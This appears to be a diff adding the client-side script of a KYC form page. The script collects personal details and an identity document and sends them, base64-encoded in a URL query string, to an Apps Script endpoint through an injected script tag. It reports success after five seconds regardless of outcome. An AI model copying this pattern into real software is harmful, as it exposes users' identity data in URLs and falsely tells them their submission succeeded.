+  uploadArea.addEventListener('dragover', e => { e.preventDefault(); uploadArea.classList.add('drag'); });
+  uploadArea.addEventListener('dragleave', () => uploadArea.classList.remove('drag'));
+  uploadArea.addEventListener('drop', e => {
+    e.preventDefault(); uploadArea.classList.remove('drag');
+    if (e.dataTransfer.files[0]) { fileInput.files = e.dataTransfer.files; showFilename(); }
+  });
+  fileInput.addEventListener('change', showFilename);
+  function showFilename() {
+    const f = fileInput.files[0];
+    uploadFilename.textContent = f ? f.name : '';
+    uploadFilename.style.display = f ? 'block' : 'none';
+  }
+
+  // Validation helpers
+  function setError(id, msg, show) {
+    const input = document.getElementById(id);
+    const err   = document.getElementById(id + '-err');
+    if (!input || !err) return;
+    if (show) { input.classList.add('error');    err.classList.add('show');    err.textContent = msg; }
+    else       { input.classList.remove('error'); err.classList.remove('show'); }
+  }
+
+  function validateForm() {
+    let ok = true;
+    const fullName  = document.getElementById('fullName').value.trim();
+    const email     = document.getElementById('email').value.trim();
+    const phone     = document.getElementById('phone').value.trim();
+    const address   = document.getElementById('address').value.trim();
+    const country   = document.getElementById('country').value;
+    const regNumber = document.getElementById('regNumber').value.trim();
+    const file      = fileInput.files[0];
+
+    if (!fullName) { setError('fullName','Please enter your full name.', true); ok=false; }
+    else setError('fullName','',false);
+
+    const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    if (!email || !emailOk) { setError('email','Please enter a valid email address.', true); ok=false; }
+    else setError('email','',false);
+
+    if (phone && !/^[\+\d\s\-\(\){}]{6,}$/.test(phone)) {
+      setError('phone','Please enter a valid phone number.', true); ok=false;
+    } else setError('phone','',false);
+
+    if (!address) { setError('address','Please enter your address.', true); ok=false; }
+    else setError('address','',false);
+
+    if (!country) { setError('country','Please select a country.', true); ok=false; }
+    else setError('country','',false);
+
+    if (!regNumber) { setError('regNumber','Please enter your registration number.', true); ok=false; }
+    else setError('regNumber','',false);
+
+    if (!file) {
+      const uploadArea = document.getElementById('uploadArea');
+      uploadArea.style.borderColor = '#e53935';
+      const hint = uploadArea.querySelector('.upload-hint');
+      hint.style.color = '#e53935';
+      hint.textContent = 'Please upload an identity document.';
+      ok=false;
+    } else {
+      const uploadArea = document.getElementById('uploadArea');
+      uploadArea.style.borderColor = '';
+      const hint = uploadArea.querySelector('.upload-hint');
+      hint.style.color = '';
+      hint.textContent = 'JPEG · PNG · PDF · Max 10 MB';
+    }
+
+    return ok;
+  }
+
+  // Submit
+  document.getElementById('kycForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    if (!validateForm()) return;
+
+    const btn = document.getElementById('submitBtn');
+    const statusMsg = document.getElementById('statusMsg');
+    btn.disabled = true;
+    btn.textContent = 'Submitting…';
+    statusMsg.className = 'status';
+
+    const payload = {
+      fullName:   document.getElementById('fullName').value.trim(),
+      email:      document.getElementById('email').value.trim(),
+      phone:      document.getElementById('phone').value.trim(),
+      address:    document.getElementById('address').value.trim(),
+      country:    document.getElementById('country').value,
+      regNumber:  document.getElementById('regNumber').value.trim(),
+      timestamp:  new Date().toISOString(),
+    };
+
+    const file = fileInput.files[0];
+    if (file) {
+      try {
+        payload.fileName    = file.name;
+        payload.fileType    = file.type;
+        payload.fileData    = await toBase64(file);
+      } catch(err) {
+        console.warn('File read error:', err);
+      }
+    }
+
+    try {
+      const url = APPS_SCRIPT_URL + '?data=' + encodeURIComponent(JSON.stringify(payload));
+      await new Promise((resolve, reject) => {
+        const script = document.createElement('script');
+        script.src = url + '&callback=handleKYCResponse';
+        script.onerror = reject;
+        window.handleKYCResponse = function() { resolve(); delete window.handleKYCResponse; };
+        setTimeout(resolve, 5000); // resolve after 5s regardless
+        document.head.appendChild(script);
+      });
+      statusMsg.className = 'status success';
+      statusMsg.textContent = '✓ Your KYC submission was received. Our legal team will be in touch shortly.';
+      document.getElementById('kycForm').reset();
+      uploadFilename.style.display = 'none';
+    } catch (err) {
+      statusMsg.className = 'status error';
+      statusMsg.textContent = '✗ Something went wrong: ' + err.message + '. Please try again or contact support.';
+    }
+
+    btn.disabled = false;
+    btn.textContent = 'Submit for KYC Review';
+  });
+
+  function toBase64(file) {
+    return new Promise((resolve, reject) => {
+      const reader = new FileReader();
+      reader.onload  = () => resolve(reader.result.split(',')[1]);
+      reader.onerror = reject;
+      reader.readAsDataURL(file);
+    });
+  }
+</script>
+
+</body>
+</html>
